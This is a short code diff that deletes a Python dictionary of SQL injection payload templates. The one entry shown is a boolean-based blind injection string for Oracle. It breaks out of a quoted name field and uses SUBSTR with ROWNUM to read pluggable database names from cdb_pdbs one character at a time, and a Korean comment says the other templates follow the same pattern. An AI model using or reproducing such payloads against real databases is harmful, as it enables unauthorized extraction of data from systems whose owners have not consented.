@@ -1,4 +1,0 @@
-payload_templates = {
-    "database_name": "김황(X0148366)' AND SUBSTR((SELECT pdb_name FROM (SELECT pdb_name, ROWNUM AS rn FROM cdb_pdbs WHERE CON_ID > 2) WHERE rn={row_index}), {char_index}, 1) = '{char}' --",
-    # 나머지 템플릿 동일
-}
